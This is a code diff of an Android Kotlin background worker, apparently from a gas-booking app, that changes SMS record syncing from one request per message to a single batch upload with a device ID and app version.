@@ -4,8 +4,10 @@ import android.content.Context
 import androidx.work.CoroutineWorker
 import androidx.work.WorkerParameters
 import com.gasbooking.app.network.RetrofitClient
+import com.gasbooking.app.network.SMSBatchRequest
 import com.gasbooking.app.network.SMSRequest
 import com.gasbooking.app.utils.DatabaseHelper
+import com.gasbooking.app.utils.DeviceUtils
 import java.lang.Exception
 
 class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
@@ -16,32 +18,33 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
 
         if (unsyncedList.isEmpty()) return Result.success()
 
-        for (sms in unsyncedList) {
-            try {
-                // 1. Prepare Request (matching backend JSON)
-                val request = SMSRequest(
-                    sender = sms.sender,
-                    message = sms.body,
-                    timestamp = sms.timestamp.toString()
-                )
+        val deviceId = DeviceUtils.getDeviceId(applicationContext)
+        val appVersion = "2.1.0" // Current Production Version
 
-                // 2. Sync via API
-                val response = RetrofitClient.smsApi.saveSMS(request)
-
-                if (response.isSuccessful) {
-                    // 3. Update sync status locally on Success
-                    dbHelper.updateSyncStatus(sms.id!!, 1) // 1 = synced
-                    println("SMS SYNC SUCCESS: ID ${sms.id}")
-                } else {
-                    println("SMS SYNC FAILED: API Error ${response.code()}")
-                }
-
-            } catch (e: Exception) {
-                // If network fails, return Retry to try again later
-                return Result.retry()
-            }
+        // 1. Prepare Batch Request
+        val smsData = unsyncedList.map { 
+            SMSRequest(it.sender, it.body, it.timestamp.toString()) 
         }
+        val request = SMSBatchRequest(deviceId, appVersion, smsData)
 
-        return Result.success()
+        try {
+            // 2. Sync Entire Batch via API
+            val response = RetrofitClient.smsApi.saveSMSBatch(request)
+
+            if (response.isSuccessful) {
+                // 3. Update sync status for all messages in batch
+                for (sms in unsyncedList) {
+                    dbHelper.updateSyncStatus(sms.id!!, 1) // 1 = synced
+                }
+                println("BATCH SYNC SUCCESS: ${unsyncedList.size} messages uploaded")
+                return Result.success()
+            } else {
+                println("BATCH SYNC FAILED: API Error ${response.code()}")
+                return Result.retry() 
+            }
+        } catch (e: Exception) {
+            println("BATCH SYNC EXCEPTION: ${e.message}")
+            return Result.retry()
+        }
     }
 }
